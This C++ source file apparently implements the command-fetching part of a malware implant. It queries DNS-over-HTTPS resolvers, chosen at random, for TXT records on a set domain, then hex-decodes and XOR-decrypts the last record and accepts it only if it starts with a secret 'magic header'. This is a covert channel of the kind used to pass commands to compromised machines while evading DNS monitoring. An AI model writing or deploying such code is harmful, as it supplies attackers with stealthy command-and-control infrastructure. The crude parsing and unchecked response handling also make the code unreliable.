#include "doh_query.h"
#include "httplib.h"

doh_query::doh_query(string check_domain, string header, string xor_key, vector<string> doh_servers) {
	doh_resolvers = doh_servers;
	xor_pass = xor_key;
	domain = check_domain;
	magic_header = header;
}

const char* doh_query::choose_doh_server(void) {
	return doh_resolvers[rand() % doh_resolvers.size() + 0].c_str();
}

bool doh_query::is_correct_header(string record) {
	size_t record_len = record.size();
	size_t header_len = magic_header.size();
	if (record_len >= header_len) {
		if (record.substr(0, header_len) == magic_header) {
			return true;
		}
	}
	return false;
}

string doh_query::get_txt_results(void) {
	
	
//set our resolver
	string doh_resolver = "https://";
	doh_resolver.append(choose_doh_server());


	//create client object
	httplib::Client cli(doh_resolver);


	//set http headers
	httplib::Headers headers = {
	{ "accept", "application/dns-json" }
	};

	//get the results
	string query = "/dns-query?name=";
	query.append(domain.c_str());
	query.append("&type=TXT");
	
	auto res = cli.Get(query.c_str(), headers);
	res->status;
	std::string responseData = res->body;

	//this is our super elegant JSON parser xd
	
	std::vector<std::string> records;


	while (responseData.find("\\") != -1) {
		size_t firstMarker = responseData.find("\\") + 2;
		size_t secondMarker = responseData.find("\\", firstMarker + 1);

		records.push_back(responseData.substr(firstMarker, secondMarker - firstMarker));
		responseData.erase(0, secondMarker + 1);
	}
	//we now have a vector for each element


	if (!records.empty()) {
		string record = records.back();
		records.pop_back();
		record = c.xor_operation(c.hex_decode(record), xor_pass);
		if (!record.empty() && is_correct_header(record)) {
			return record;
		}
	}

	return string();
}
